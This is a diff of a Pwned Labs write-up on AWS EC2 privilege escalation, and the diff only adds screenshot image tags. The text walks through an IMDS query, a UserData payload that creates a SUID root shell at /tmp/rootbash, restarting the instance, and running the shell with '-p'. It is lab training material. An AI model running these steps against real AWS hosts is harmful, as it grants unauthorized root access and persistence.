@@ -1,13 +1,15 @@
 AWS EC2 UserData Privilege Escalation (Pwned Labs Write-Up)Lab Title: Command Injection / AWS IAM Misconfiguration to EC2 UserData Privilege EscalationPlatform: Pwned LabsTarget Architecture: AWS EC2, IAM, Linux HostAuthor: Lethabo Sangweni1. Executive SummaryDuring this lab, an initial access foothold was leveraged to inspect local AWS credentials and permissions. Enumeration revealed a misconfigured IAM policy granting sensitive EC2 management permissions (ec2:ModifyInstanceAttribute, ec2:StopInstances, ec2:StartInstances, ec2:DescribeInstances).  By stopping the target EC2 instance, injecting a custom Base64-encoded bash script into the instance's UserData attribute, and restarting the virtual machine, the payload executed with local root privileges upon system boot. This granted local host root escalation and persistence.  2. Technical Prerequisites & Required PermissionsThe privilege escalation vector relies on holding the following set of IAM permissions on the target EC2 resource:IAM PermissionAction / Impactec2:DescribeInstancesEnumerate instance IDs, status, and attached roles.ec2:StopInstancesShut down the targeted EC2 instance (required to modify UserData).ec2:ModifyInstanceAttributeModify the base64-encoded userData attribute.ec2:StartInstancesBoot the instance to trigger cloud-init payload execution.3. Attack Execution WalkthroughPhase 1: Reconnaissance & Target IdentificationFrom the compromised host session, retrieve the target instance ID via Instance Metadata Service (IMDSv1/v2) or AWS CLI:Bash# Retrieve current Instance ID via IMDS
 INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
 echo "Target Instance ID: $INSTANCE_ID"
-
+<img width="962" height="921" alt="website" src="https://github.com/user-attachments/assets/9a8d2e56-f5f6-4bc4-8579-5517293aefde" />
 # Verify IAM permissions against EC2
 aws ec2 describe-instances \
     --instance-ids $INSTANCE_ID \
     --query "Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile.Arn]"
 Phase 2: Weaponization (Payload Creation)Draft a script that grants SUID administrative privilege to /bin/bash or creates an elevated backdoor user.Bashcat << 'EOF' > malicious_userdata.sh
 #!/bin/bash
+<img width="962" height="999" alt="UserPolicies" src="https://github.com/user-attachments/assets/e7c7f4ec-87ed-419f-b3f7-6929d753e362" />
+
 # Pwned Labs EC2 UserData Privilege Escalation Payload
 
 # Copy standard shell and assign SUID bit for root access
@@ -42,6 +44,8 @@ aws ec2 start-instances --instance-ids $INSTANCE_ID
 aws ec2 wait instance-running --instance-ids $INSTANCE_ID
 Phase 4: Privilege Escalation VerificationLog back into the SSH/shell context once the server finishes booting and verify root access via the generated SUID binary:  Bash# Execute the SUID binary with preserved privileges
 /tmp/rootbash -p
+<img width="962" height="1072" alt="flag" src="https://github.com/user-attachments/assets/42ecf94d-16a5-4ad9-abd4-61109485d917" />
+
 
 # Confirm elevated effective user ID (euid=0)
 id
